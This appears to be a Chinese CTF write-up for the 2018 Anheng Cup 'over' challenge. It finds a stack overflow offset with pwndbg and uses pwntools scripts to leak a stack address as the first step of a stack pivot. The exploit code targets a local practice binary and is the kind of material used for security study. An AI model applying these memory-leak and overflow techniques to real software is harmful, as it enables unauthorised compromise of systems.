# 2018_安恒杯_over
## stack pivot

溢出偏移
```
pwndbg> cyclic -n 8 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> cyclic -n 8 -l laaaaaaa
88
```

发送80个字节，回显会泄露ebp，然后根据ebp的距离泄露栈地址,距离为-0x70
```python
from pwn import *

context.log_level = 'debug'
p = process('./over.over')

p.recvuntil('>')
pause()
p.send('A' * 80)
```
```
gdb -q -p `pidof over.over` -ex "b *0x4006B9" -ex "c"
```
```
pwndbg> stack 15
00:0000│ rax rdi rsi rsp  0x7fff1c2a8dc0 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓
0a:0050│ rbp              0x7fff1c2a8e10 —▸ 0x7fff1c2a8e30 —▸ 0x400730 ◂— push   r15
0b:0058│                  0x7fff1c2a8e18 —▸ 0x400715 ◂— test   eax, eax
0c:0060│                  0x7fff1c2a8e20 —▸ 0x7fff1c2a8f18 —▸ 0x7fff1c2aa729 ◂— './over.over'
0d:0068│                  0x7fff1c2a8e28 ◂— 0x100000000
0e:0070│                  0x7fff1c2a8e30 —▸ 0x400730 ◂— push   r15
pwndbg> distance 0x7fff1c2a8e30 0x7fff1c2a8dc0
0x7fff1c2a8e30->0x7fff1c2a8dc0 is -0x70 bytes (-0xe words)
pwndbg>
```

```python
from pwn import *

context.log_level = 'debug'
p = process('./over.over')

p.recvuntil('>')
p.send('A' * 80)
stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x70
print 'stack addr @ {:#x}'.format(stack_addr)
```
